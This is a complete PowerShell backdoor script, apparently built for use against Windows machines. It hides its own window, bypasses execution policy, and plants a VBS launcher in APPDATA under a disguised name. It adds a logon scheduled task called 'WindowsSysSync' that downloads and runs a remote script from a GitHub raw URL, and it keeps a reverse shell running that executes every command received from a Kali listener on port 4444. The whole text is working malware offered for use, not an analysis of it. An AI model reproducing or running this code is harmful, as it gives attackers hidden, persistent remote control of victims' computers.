# --- 1. THE STEALTH START ---
# This line checks if the script is already running hidden. 
# If not, it relaunches itself in "Super-Hidden" mode and exits the visible one instantly.
if ($Host.Name -eq "ConsoleHost" -and !$env:GHOST) {
    $env:GHOST = "TRUE"
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# --- 2. CONFIGURATION ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444
$VBSPath = "$env:APPDATA\win_sys_helper.vbs"

# --- 3. PERSISTENCE SETUP ---
# Create the VBS (This is the secret to 0 taskbar icons)
$VBSCode = "Set W=CreateObject('WScript.Shell'):W.Run 'powershell -NoP -W Hidden -E Bypass -C IEX(New-Object Net.WebClient).DownloadString(''$Url'')',0,False"
Set-Content -Path $VBSPath -Value $VBSCode -Force

# Create the Scheduled Task (If it doesn't exist)
if (!(Get-ScheduledTask -TaskName "WindowsSysSync" -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsSysSync" -Action $Action -Trigger $Trigger -Force
}

# --- 4. THE BEACON LOOP ---
# We wait 20 seconds only if we just booted up (to let Wi-Fi connect)
if ([Environment]::TickCount -lt 300000) { Start-Sleep -Seconds 30 }

while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- GHOST CONNECTED ---")
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch {
        # If Kali isn't listening, wait 10 seconds and try again
        Start-Sleep -Seconds 10
    }
}
